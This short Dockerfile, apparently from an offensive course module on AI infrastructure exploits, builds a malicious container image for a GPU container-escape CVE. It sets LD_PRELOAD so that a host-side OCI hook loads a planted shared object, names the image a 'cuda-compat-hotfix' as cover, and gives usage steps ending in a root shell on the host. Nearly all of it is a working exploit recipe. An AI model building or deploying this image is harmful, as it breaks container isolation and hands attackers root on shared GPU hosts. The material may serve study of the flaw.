# Script: gpu_escape_dockerfile
# Module: 09 — AI Infrastructure and Deployment Exploits
# Purpose: Malicious container image for CVE-2025-23266 GPU escape
# Usage:
#   gcc -shared -fPIC -nostartfiles -o cuda_compat_shim.so gpu_escape_cve_2025_23266.c
#   sudo /opt/ridgeline/tools/gpu-build.sh -t cuda-compat-hotfix -f gpu_escape_dockerfile .
#   sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done
#   # After run: sudo su robertj  →  sudo bash  →  root
#
# Key: LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
#   /proc/self/cwd from OCI hook perspective = container root on HOST filesystem
#   so it finds /cuda_compat_shim.so inside the image, which maps to host path

FROM busybox
# This env var persists into OCI hook processes (the CVE)
ENV LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
# The .so sits at / inside the image = what /proc/self/cwd resolves to on host
ADD cuda_compat_shim.so /
